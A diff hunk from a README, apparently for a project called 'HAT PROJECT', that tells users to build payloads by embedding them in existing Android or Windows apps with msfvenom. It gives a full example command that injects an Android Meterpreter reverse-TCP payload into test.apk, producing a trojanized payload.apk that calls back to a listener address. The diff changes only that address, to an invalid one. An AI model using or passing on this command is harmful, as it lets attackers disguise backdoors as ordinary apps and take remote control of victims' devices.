@@ -10,7 +10,7 @@ HAT PROJECT
 
 *Generate the payloads with msfvenom -x command using existing android/windows applications.
 
-*Example-  msfvenom -x /sdcard/test.apk -p android/meterpreter/reverse_tcp LHOST=168.9.0.1 LPORT=4444 -o /sdcard/payload.apk
+*Example-  msfvenom -x /sdcard/test.apk -p android/meterpreter/reverse_tcp LHOST=0000.0.0.0 LPORT=4444 -o /sdcard/payload.apk
 
 
 "IF YOU LIKE MY HARD WORK, GIMME A CUP OF COFFEE"
